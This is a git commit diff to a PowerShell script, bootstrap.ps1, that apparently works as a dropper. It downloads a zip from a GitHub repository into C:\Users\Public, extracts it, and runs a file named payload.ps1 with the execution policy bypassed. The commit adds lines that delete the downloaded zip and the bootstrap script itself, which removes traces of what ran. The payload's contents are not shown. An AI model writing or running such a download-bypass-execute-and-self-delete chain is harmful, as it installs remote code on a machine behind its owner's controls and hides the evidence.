e2eabd2f640b42bedfe58dfd12cb808dcd8aa8b8
kenawhy <108243883+kenawhy@users.noreply.github.com>
2025-05-13 20:57:59 +0900

    Update bootstrap.ps1

--- bootstrap.ps1
+++ bootstrap.ps1
@@ -1,3 +1,5 @@
 Invoke-WebRequest -Uri 'https://github.com/kenawhy/teleportScroll/archive/refs/heads/main.zip' -OutFile 'C:\Users\Public\teleportScroll.zip'
 Expand-Archive -Path 'C:\Users\Public\teleportScroll.zip' -DestinationPath 'C:\Users\Public\teleportScroll'
 Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File C:\Users\Public\teleportScroll\teleportScroll-main\payload.ps1'
+Remove-Item 'C:\Users\Public\teleportScroll.zip' -Force
+Remove-Item 'C:\Users\Public\bootstrap.ps1' -Force
